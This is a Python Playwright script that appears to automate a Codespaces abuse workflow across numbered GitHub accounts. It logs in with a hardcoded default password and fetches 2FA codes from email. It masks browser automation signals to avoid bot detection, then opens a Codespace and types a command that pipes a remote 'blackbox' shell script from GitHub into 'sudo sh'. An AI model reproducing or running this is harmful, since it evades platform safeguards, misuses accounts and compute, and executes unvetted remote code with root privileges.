import argparse
import time
import sys
import cv2
import numpy as np
from playwright.sync_api import sync_playwright
from ck_params import get_ck
from get_2FA import get_2fa

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--session", type=int, required=True)
parser.add_argument("--password", default="baba123A*", help="GitHub password")
args = parser.parse_args()
args.user = get_ck(args.session)

# ── colors ──────────────────────────────────────────────────────────────────
C = {
    "reset":  "\033[0m",
    "bold":   "\033[1m",
    "cyan":   "\033[96m",
    "green":  "\033[92m",
    "yellow": "\033[93m",
    "red":    "\033[91m",
    "grey":   "\033[90m",
    "blue":   "\033[94m",
    "magenta":"\033[95m",
    "white":  "\033[97m",
}
SESSION_COLORS = {1: "cyan", 2: "green", 3: "magenta", 4: "yellow", 5: "blue"}
_sc = SESSION_COLORS.get(args.session, "white")
SID = f"{C['bold']}{C[_sc]}[S{args.session}]{C['reset']}"

def log(msg, color="reset"):
    print(f"{SID} {C[color]}{msg}{C['reset']}")

# ── check tracking ───────────────────────────────────────────────────────────
check_counts   = {}
_last_check_key = [None]

def is_found(page, template_path, threshold=0.8):
    try:
        check_counts[template_path] = check_counts.get(template_path, 0) + 1
        n = check_counts[template_path]

        if _last_check_key[0] == template_path:
            print(f"{C['grey']}.{C['reset']}", end="", flush=True)
        else:
            if _last_check_key[0] is not None:
                print()
            print(f"{SID} {C['yellow']}[check #{n}]{C['reset']} {C['grey']}{template_path}{C['reset']}", end="", flush=True)
            _last_check_key[0] = template_path

        screenshot = np.frombuffer(page.screenshot(timeout=15000), np.uint8)
        screen = cv2.imdecode(screenshot, cv2.IMREAD_COLOR)
        template = cv2.imread(template_path)
        result = cv2.matchTemplate(screen, template, cv2.TM_CCOEFF_NORMED)
        _, max_val, _, _ = cv2.minMaxLoc(result)
        return max_val >= threshold
    except Exception as e:
        print()
        _last_check_key[0] = None
        log(f"Screenshot failed: {e}", "red")
        return False

def _end_check_line():
    if _last_check_key[0] is not None:
        print()
        _last_check_key[0] = None

def wait_until_ready(page, wait_template="src/wait.png", interval=3):
    while is_found(page, wait_template):
        page.wait_for_timeout(interval * 1000)
    _end_check_line()
    log("Codespace is ready!", "green")

def find_and_click(page, template_path, threshold=0.8):
    screenshot = np.frombuffer(page.screenshot(), np.uint8)
    screen = cv2.imdecode(screenshot, cv2.IMREAD_COLOR)
    template = cv2.imread(template_path)
    result = cv2.matchTemplate(screen, template, cv2.TM_CCOEFF_NORMED)
    _, max_val, _, max_loc = cv2.minMaxLoc(result)

    if max_val < threshold:
        raise Exception(f"Template not found (confidence: {max_val:.2f})")

    h, w = template.shape[:2]
    center_x = max_loc[0] + w // 2
    center_y = max_loc[1] + h // 2
    page.mouse.click(center_x, center_y)
    return center_x, center_y


def github_login(page, username, password):
    log("[auth] Navigating to GitHub login...", "blue")
    page.goto("https://github.com/login", timeout=120000)
    page.wait_for_timeout(2000)
    page.fill("#login_field", username)
    page.wait_for_timeout(800)
    page.fill("#password", password)
    page.wait_for_timeout(600)
    page.click("[name='commit']")
    page.wait_for_timeout(3000)

    # Handle 2FA / OTP if prompted
    if page.locator("#app_totp").count() > 0 or page.locator("[name='otp']").count() > 0:
        log("[auth] 2FA required, fetching code from email...", "yellow")
        otp = get_2fa(username)
        if not otp:
            log("[auth] Failed to retrieve 2FA code!", "red")
            page.screenshot(path=f"2fa_failed-{args.session}.png")
            raise SystemExit(1)
        log(f"[auth] Got 2FA code: {otp}", "green")
        selector = "#app_totp" if page.locator("#app_totp").count() > 0 else "[name='otp']"
        page.fill(selector, otp)
        page.keyboard.press("Enter")
        page.wait_for_timeout(3000)

    # Confirm we're logged in
    if page.locator("meta[name='user-login']").count() == 0:
        log("Login may have failed — saving screenshot and exiting.", "red")
        page.screenshot(path=f"login_failed-{args.session}.png")
        raise SystemExit(1)

    log("[auth] Login successful!", "green")


with sync_playwright() as p:
    log("[1/7] Launching browser...", "blue")
    browser = p.chromium.launch(
        headless=True,
        args=[
            "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--window-size=1920,1080", "--disable-blink-features=AutomationControlled",
        ]
    )
    context = browser.new_context(
        viewport={"width": 1920, "height": 1080},
        user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        locale="en-US",
        timezone_id="America/New_York",
        java_script_enabled=True,
    )
    context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    context.set_default_timeout(300000)
    context.set_default_navigation_timeout(300000)
    page = context.new_page()

    github_login(page, args.user, args.password)
    time.sleep(3)
    page.screenshot(path=f"session-{args.session}.png")
    log(f"Screenshot saved: session-{args.session}.png", "green")

    log("[2/7] Navigating to GitHub Codespaces...", "blue")
    page.goto("https://github.com/codespaces?unpublished=true", timeout=300000)
    page.wait_for_timeout(15000)
    page.screenshot(path=f"codespaces-{args.session}.png")
    log(f"Codespaces page screenshot saved: codespaces-{args.session}.png", "grey")

    log("[2.1/7] Finding codespace link...", "blue")
    # Extract codespace name from the page and navigate directly
    codespace_link = page.locator("a[href*='/codespaces/']").first
    try:
        codespace_link.wait_for(state="visible", timeout=30000)
        href = codespace_link.get_attribute("href")
        # Build direct browser URL: https://CODESPACE_NAME.github.dev
        codespace_name = href.strip("/").split("/")[-1]
        direct_url = f"https://{codespace_name}.github.dev"
        log(f"Opening codespace directly: {direct_url}", "grey")
        page.goto(direct_url, timeout=300000)
    except Exception:
        # Fallback: try kebab menu
        log("Direct link not found, trying kebab menu...", "yellow")
        page.screenshot(path=f"codespaces-{args.session}.png")
        kebab_selectors = [
            "button.Button--iconOnly .octicon-kebab-horizontal",
            "[data-testid='codespace-kebab-menu']",
            "button[aria-label*='pen']",
            "button[aria-label*='more']",
        ]
        clicked = False
        for sel in kebab_selectors:
            try:
                loc = page.locator(sel).first
                loc.wait_for(state="visible", timeout=10000)
                loc.click()
                clicked = True
                log(f"Clicked kebab with: {sel}", "grey")
                break
            except Exception:
                continue
        if not clicked:
            log("Could not open codespace — check codespaces-N.png", "red")
            browser.close()
            exit(1)
        page.wait_for_timeout(5000)
        page.get_by_text("Open in Browser").click()
        new_page = context.wait_for_event("page")
        new_page.wait_for_load_state()
        page.close()
        page = new_page
    time.sleep(5)
    try:
        page.reload()
    except Exception:
        pass
    time.sleep(5)

    _first_setting_space = True
    while is_found(page, "src/setting_space.png"):
        _end_check_line()
        if _first_setting_space:
            log("setting_space detected for the first time — waiting 10s then refreshing...", "yellow")
            time.sleep(10)
            try:
                page.reload()
            except Exception:
                pass
            _first_setting_space = False
            continue
        log("setting_space still present, waiting up to 2 minutes...", "yellow")
        for _ in range(8):
            page.wait_for_timeout(15000)
            if not is_found(page, "src/setting_space.png"):
                break
        _end_check_line()
        if is_found(page, "src/setting_space.png"):
            _end_check_line()
            log("Still stuck, refreshing...", "yellow")
            try:
                page.reload()
            except Exception:
                pass
    _end_check_line()
    log("setting_space cleared, continuing...", "green")

    while True:
        log("[3/7] Checking if codespace is loading...", "blue")

        attempt = [0]
        while not is_found(page, "src/wait.png"):
            attempt[0] += 1
            sys.stdout.write(f"\r{SID} {C['yellow']}waiting for wait.png... attempt {attempt[0]}{C['reset']}  ")
            sys.stdout.flush()
            page.wait_for_timeout(15000)
        _end_check_line()
        log("wait.png detected! Codespace is loading...", "green")
        wait_until_ready(page)

        attempt[0] = 0
        for _ in range(20):
            if is_found(page, "src/terminal.png"):
                break
            attempt[0] += 1
            sys.stdout.write(f"\r{SID} {C['yellow']}waiting for terminal.png... attempt {attempt[0]}{C['reset']}  ")
            sys.stdout.flush()
            page.wait_for_timeout(15000)
        _end_check_line()
        log("Terminal ready!", "green")

        log("[4/7] Clicking terminal tab...", "blue")
        page.screenshot(path="debug_before_terminal.png")
        try:
            screenshot = np.frombuffer(page.screenshot(), np.uint8)
            screen = cv2.imdecode(screenshot, cv2.IMREAD_COLOR)
            template = cv2.imread("src/terminal.png")
            result = cv2.matchTemplate(screen, template, cv2.TM_CCOEFF_NORMED)
            _, max_val, _, max_loc = cv2.minMaxLoc(result)

            if max_val < 0.6:
                raise Exception(f"Terminal not found (confidence: {max_val:.2f})")

            h, w = template.shape[:2]
            click_x = max_loc[0] + w // 2
            click_y = max_loc[1] + h + 50
            log(f"Clicking at ({click_x}, {click_y})", "grey")
            page.mouse.click(click_x, click_y)
        except Exception as e:
            log(f"Failed to find terminal: {e}", "red")
            log("Check debug_before_terminal.png and compare with src/terminal.png", "yellow")
            browser.close()
            exit(1)
        page.wait_for_timeout(15000)

        log("[5/7] Typing command...", "blue")
        page.keyboard.type("   curl 'https://raw.githubusercontent.com/hasnaouiyacine59-wq/blackbox/refs/heads/master/init_.sh' | sudo sh\n")

        attempt[0] = 0
        while not is_found(page, "src/restart.png"):
            attempt[0] += 1
            sys.stdout.write(f"\r{SID} {C['yellow']}waiting for restart.png... attempt {attempt[0]}{C['reset']}  ")
            sys.stdout.flush()
            page.wait_for_timeout(15000)
        _end_check_line()
        log("Restart detected! Clicking restart...", "green")
        find_and_click(page, "src/restart.png")
        page.wait_for_timeout(15000)
